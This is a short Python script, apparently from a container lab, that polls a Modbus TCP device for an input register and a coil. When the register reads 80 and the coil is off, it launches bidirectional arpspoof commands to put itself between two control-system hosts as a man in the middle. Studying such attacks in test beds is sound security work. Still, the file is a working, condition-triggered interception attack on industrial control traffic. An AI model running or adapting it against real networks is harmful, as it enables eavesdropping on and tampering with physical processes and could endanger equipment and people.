from pymodbus.client.sync import ModbusTcpClient
import subprocess

# Set up the Modbus client
client = ModbusTcpClient('172.17.0.3', port=502)

# Connect to the Modbus server
client.connect()

while True:
    # Read an input register (address 100) from the Modbus server
    result = client.read_input_registers(address=0, count=1, unit=1)
    resultcoil = client.read_coils(address=1, count=1, unit=1)

    if result.isError():
        # Handle any errors that occurred
        print(f"Error reading input register: {result}")
    else:
        # Print the value of the input register
        value = result.registers[0]
        print(f"Input register value: {value}")
        valuecoil = resultcoil.bits[0]
        print(f"Input register value: {valuecoil}")
        # Check if the input register value is 80
        if value == 80 and valuecoil == False:
            subprocess.Popen(["arpspoof -i eth0 -t 172.17.0.3 172.17.0.2"], shell=True)
            subprocess.Popen(["arpspoof -i eth0 -t 172.17.0.2 172.17.0.3"], shell=True)
        else:
            # Print a message to indicate that the input register value was not 80
            print("Input register value is not 80")

# Disconnect from the Modbus server
client.close()